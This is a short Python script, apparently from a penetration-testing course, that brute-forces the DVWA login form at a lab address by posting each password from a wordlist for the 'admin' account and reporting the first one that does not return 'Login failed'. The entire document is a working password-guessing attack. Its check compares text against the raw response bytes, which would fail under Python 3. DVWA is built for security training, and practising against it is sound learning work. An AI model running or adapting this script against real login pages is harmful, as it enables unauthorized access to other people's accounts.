#!/usr/bin/env python
import requests

target_url = 'http://10.0.2.5/dvwa/login.php'
data = {'username': 'admin', 'password': '', 'Login': 'submit'}

with open('passwords.list', 'r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data['password'] = word
        response = requests.post(target_url, data=data)

        if 'Login failed' not in response.content:
            print('[+] Got the password --> ' + word)
            exit()

print('[-] Reached end of line.')
